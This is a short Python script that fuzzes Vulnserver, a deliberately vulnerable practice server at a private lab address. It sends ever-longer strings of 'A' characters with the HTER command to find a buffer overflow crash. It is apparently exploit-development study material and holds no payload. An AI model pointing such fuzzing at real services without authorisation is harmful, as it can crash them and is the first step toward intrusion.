#!/usr/bin/python

import socket
def main():
    try:
        # create connection with the vulnserver
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.0.2.4',9999))
        # print(s.recv(1024))
        # s.send('HELP')
        COMMANDS = ["STATS", "RTIME", "LTIME", "SRUN", "TRUN", "GMON", "GDOG", "KSTET", "GTER", "HTER", "LTER", "KSTAN"]  
        COMMANDS = ["HTER"]
        for command in COMMANDS: 
            for i in range(10,10000,10):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('10.0.2.4',9999))
                message = "A"*i
                s.send(command + " " + message)
                print("Fuzzed with {} As".format(i))
                response = s.recv(1024)
                print(response)
                s.close()
    except:
        print("Fuzzer killed the server")

main()
    
